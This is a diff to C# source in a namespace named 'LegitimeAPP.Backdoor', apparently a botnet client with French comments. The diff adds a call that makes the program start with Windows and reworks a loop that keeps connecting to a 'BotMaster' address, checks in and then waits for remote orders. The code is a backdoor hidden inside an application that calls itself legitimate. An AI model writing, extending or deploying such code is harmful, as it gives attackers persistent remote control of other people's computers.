@@ -1,4 +1,3 @@
-
 using System ;
 using System.Net ;
 using System.Net.Sockets ;
@@ -43,6 +42,10 @@ namespace LegitimeAPP.Backdoor {
 
             order = new Order(TypeAction.WAIT) ;
 
+            /*
+            Pour mettre le programme en démarrage de l'ordinateur
+            Pour l'instant ne fonctionne que sur Windows 
+            */
             _ = new Startup() ; 
 
 
@@ -63,11 +66,6 @@ namespace LegitimeAPP.Backdoor {
                 _attackInProgress = false ;  
             } ;  
 
-
-
-
-
-
             _attackInProgress = false; 
 
 
@@ -83,10 +81,6 @@ namespace LegitimeAPP.Backdoor {
             _FollowingOrders.Name = "" ;
 
             _ConnectionRequests.Start() ;
-
-
- 
-             
         }
 
 
@@ -200,6 +194,8 @@ namespace LegitimeAPP.Backdoor {
                     Console.WriteLine(ex.Message) ; 
                 }
 
+
+               Thread.Sleep(1000) ; 
                 
             }
         }
@@ -208,36 +204,71 @@ namespace LegitimeAPP.Backdoor {
         private void MakeConnectionRequest() {
 
             while (true) {
-            tcp = new TcpClient() ;
-            try {
-                // Tentative de connexion au BotMaster 
 
-                tcp.Connect(_masterIP, _masterPort) ;
-                stm = tcp.GetStream() ;
+                
+            tcp = new TcpClient() {
+                SendTimeout = 1000
+            }  ;
 
-                WriteNetMessage("1") ; 
-                Console.WriteLine("La connexion avec le botmaster est un succès") ; 
+
+
+                try {
+                    tcp.Connect(_masterIP, _masterPort) ;
+
+
+                    stm = tcp.GetStream() ;
+                    WriteNetMessage("1") ; 
+                    Console.WriteLine("La connexion avec le botmaster est un succès") ; 
 
                 // On démarre le Thread lorsque la connexion est une réussite
 
 
                 // Reset le Thread dans le cas ou il a déjà été lancé
-                if (_FollowingOrders.ThreadState == ThreadState.Stopped)
-                {  
-                    _FollowingOrders = new Thread(ListeningOrder) ; 
+                    if (_FollowingOrders.ThreadState == ThreadState.Stopped)
+                    {  
+                        _FollowingOrders = new Thread(ListeningOrder) ; 
+                    } 
+                
+                    _FollowingOrders.Start() ; 
+                    _FollowingOrders.Join() ;
+                } catch (Exception ex) {
+                    Console.WriteLine("La connexion au BotMaster est un échec... Code d'erreur : " + ex.Message +"... Tentative dans cinq secondes... "  ) ; 
                 } 
 
-                
-                _FollowingOrders.Start() ; 
-                
-                _FollowingOrders.Join() ;
 
-            } catch( Exception _) {
 
-              //  Console.WriteLine(ex.Message) ;       
- 
-                Console.WriteLine("La connexion au BotMaster à échoué... Nouvelle tentative dans 5 secondes  ") ;
+/*
+                try {
+                if ( tcp.ConnectAsync(_masterIP, _masterPort).Wait(1000)) {
+                    stm = tcp.GetStream() ;
+
+                    WriteNetMessage("1") ; 
+                    Console.WriteLine("La connexion avec le botmaster est un succès") ; 
+
+                // On démarre le Thread lorsque la connexion est une réussite
+
+
+                // Reset le Thread dans le cas ou il a déjà été lancé
+                    if (_FollowingOrders.ThreadState == ThreadState.Stopped)
+                    {  
+                        _FollowingOrders = new Thread(ListeningOrder) ; 
+                    } 
+                
+                    _FollowingOrders.Start() ; 
+                    _FollowingOrders.Join() ;
+                } else {
+                    Console.WriteLine("La connexion au BotMaster ne répond pas... Nouvelle Tentative dans cinq secondes ") ; 
                 }
+                } catch(Exception ex) {
+                    Console.WriteLine("La connexion au BotMaster est impossible... Message d'erreur : " + ex.Message + "... Tentative dans cinq secondes...") ; 
+                }
+               
+                */
+/*
+            } catch (Exception e) 
+            {   
+                Console.WriteLine("La connexion au BotMaster à échoué... Nouvelle tentative dans 5 secondes  ") ;
+            } */
                 Thread.Sleep(5000) ;  
             }
         }
